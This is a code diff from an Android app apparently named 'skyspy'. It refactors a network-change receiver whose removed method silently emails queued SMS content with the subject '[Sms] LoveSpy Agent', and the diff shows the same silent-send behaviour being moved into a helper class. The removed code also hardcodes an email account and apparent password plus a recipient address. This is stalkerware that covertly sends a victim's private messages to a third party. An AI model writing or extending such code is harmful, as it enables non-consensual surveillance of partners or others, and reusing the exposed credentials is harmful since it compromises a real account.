@@ -4,10 +4,8 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.AsyncTask;
-import android.util.Log;
 
-import com.example.skyspy.app.email.EmailSending;
-import com.example.skyspy.app.utils.Utils;
+import com.example.skyspy.app.email.EmailHelper;
 
 import java.util.ArrayList;
 import java.util.Iterator;
@@ -25,7 +23,7 @@ public class NetworkUpdateReceiver extends BroadcastReceiver {
                     protected Void doInBackground(Void... params) {
                         Iterator<String> iter = mList.iterator();
                         while (iter.hasNext()) {
-                            boolean sending = sendEmailSilently(iter.next());
+                            boolean sending = EmailHelper.sendEmailSilently(iter.next());
                             if (sending == true) {
                                 iter.remove();
                             }
@@ -35,21 +33,6 @@ public class NetworkUpdateReceiver extends BroadcastReceiver {
                 }.execute();
             }
         }
-    }
-
-    private boolean sendEmailSilently(String letter) {
-        boolean result = false;
-        EmailSending emailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
-        String[] toArr = {"1eecooper@ukr.net"};
-        emailSending.setTo(toArr);
-        emailSending.setFrom("wooo@wooo.com");
-        emailSending.setSubject("[Sms] LoveSpy Agent");
-        try {
-            result = emailSending.sendSilently(letter);
-        } catch(Exception e) {
-            Log.e(Utils.TAG, "Could not send email", e);
-        }
-        return result;
     }
 
     public static void setLetterList(ArrayList<String> list) {
